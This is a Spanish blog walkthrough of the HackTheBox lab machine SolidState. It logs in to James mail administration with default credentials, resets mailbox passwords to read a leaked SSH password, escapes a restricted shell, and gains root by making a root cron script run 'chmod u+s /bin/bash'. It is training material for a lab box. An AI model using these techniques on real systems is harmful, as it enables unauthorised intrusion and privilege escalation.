---
title: "HackTheBox - /assets/SolidState"
layout: post
date: 2022-05-26 18:03
image: /assets/images/SQL_Injection.png
headerImage: true
tag:
- htb
- hacking
- writeup
category: blog
description: Writeup de /assets/SolidState
---

# /assets/SolidState

Dificultad: Medium
OS: Linux

# HackTheBox - /assets/SolidState

En este writeup, voy a demostrar paso a paso como conseguir el root en la máquina /assets/SolidState.

Es una máquina Linux con una dificultad media.

## Reconocimiento

Primero, aunque aparezca en el icono, es una buena práctica ver qué OS utiliza el objetivo. Para ello utilizaremos el comando `ping -c 1 {IP}` y viendo la ttl podemos saber contra qué nos enfrentamos de manera silenciosa (Linux:64 y Windows:128). En este vemos que es una máquina Linux.

![Untitled](/assets/SolidState/Untitled.png)

Nmap encuenta 6 puertos abiertos siendo estos el 22, 25, 80, 110, 119, 4555.

![Untitled](/assets/SolidState/Untitled%201.png)

Haciendo un escaneo de versiones sobre estos puertos encontramos que utiliza James 2.3.2, lo que más llama la atención es el puerto 4555, James Remote Administration Tool 2.3.2

![Untitled](/assets/SolidState/Untitled%202.png)

Buscando exploits encontramos un RCE, y en el código encontramos que los credenciales por defecto son root:root

![Untitled](/assets/SolidState/Untitled%203.png)

Y al intentar conectar vemos que las credenciales por defecto funcionan. Con help sacamos los comandos que nos deja ejecutar, siendo listusers y setpassword en las que nos centraremos.

![Untitled](/assets/SolidState/Untitled%204.png)

![Untitled](/assets/SolidState/Untitled%205.png)

Primero vamos a probar con el usuario de james.

```
setpassword james password
Password for james reset
```

Entramos y no tiene ningún correo, asi que procedemos a ir uno a uno mirando si algún usuario tiene correos.

![Untitled](/assets/SolidState/Untitled%206.png)

Rápidamente encontramos que john tiene un correo pidiendo que restrinja al usuario mindy y que la envíe un correo con una contraseña temporal

```text
Return-Path: <mailadmin@localhost>
Message-ID: <9564574.1.1503422198108.JavaMail.root@/assets/SolidState>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: john@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by /assets/SolidState (JAMES SMTP Server 2.3.2) with SMTP ID 581
          for <john@localhost>;
          Tue, 22 Aug 2017 13:16:20 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:16:20 -0400 (EDT)
From: mailadmin@localhost
Subject: New Hires access
John, 

Can you please restrict mindy's access until she gets read on to the program. Also make sure that you send her a tempory password to login to her accounts.

Thank you in advance.

Respectfully,
James
```

En el correo de mindy encontramos el mensaje con el usuario y contraseña y ahora podemos acceder por ssh a la cuenta de mindy.

```text
Return-Path: <mailadmin@localhost>
Message-ID: <16744123.2.1503422270399.JavaMail.root@/assets/SolidState>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: mindy@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by /assets/SolidState (JAMES SMTP Server 2.3.2) with SMTP ID 581
          for <mindy@localhost>;
          Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
From: mailadmin@localhost
Subject: Your Access

Dear Mindy,

Here are your ssh credentials to access the system. Remember to reset your password after your first login. 
Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path. 

username: mindy
pass: P@55W0rd1!2@

Respectfully,
James
```

![Untitled](/assets/SolidState/Untitled%207.png)

Nos encontramos que nos da una rbash (restricted shell) y solo podemos usar cat, env y ls. Al tener cat ya podemos leer flag.txt y tener el user.

![Untitled](/assets/SolidState/Untitled%208.png)

## Escalada de privilegios

No es problema tener una rbash ya que es muy fácil hacer bypass de la rbash, ya que cuando entramos en el ssh podemos especificar un comando, por lo que usando el parámetro -t y bash entramos en una bash.

![Untitled](/assets/SolidState/Untitled%209.png)

Para encontrar qué procesos se ejecutan a la larga, voy usar el comando `ps -eo command` que te saca todos los comandos que se van ejecutando y así compararlo con uno nuevo para ver que se ejecuta a la larga.

```bash
#!/bin/bash

last_process=$(ps -eo command)

while true; do
        new_process=$(ps -eo command)
        diff <(echo "$last_process") <(echo "$new_process") | grep "[\>\<]" | grep -v -E "procmon|command"
        last_process=$(ps -eo command)
done
```

Encontramos que cada x tiempo se ejecuta [tmp.py](http://tmp.py) que está en /opt asi que vamos a mirarlo.

![Untitled](/assets/SolidState/Untitled%2010.png)

Encontramos que pertenece al root y que puedo escribir en el, asi que ahora lo tenemos fácil.

![Untitled](/assets/SolidState/Untitled%2011.png)

![Untitled](/assets/SolidState/Untitled%2012.png)

Modifico el .py para otorgar privilegios SUID a la bash. Los privilegios SUID dan privilegios de ejecución del propietario, en este caso root.

```python
#!/usr/bin/env python

import os

os.system("chmod u+s /bin/bash")
```

Aquí se puede ver como se asigna ese bit s, por lo que ya tengo SUID.

![Untitled](/assets/SolidState/Untitled%2013.png)

Y ahora abriendo otra bash, tenemos privilegios de root y ende, la flag.

![Untitled](/assets/SolidState/Untitled%2014.png)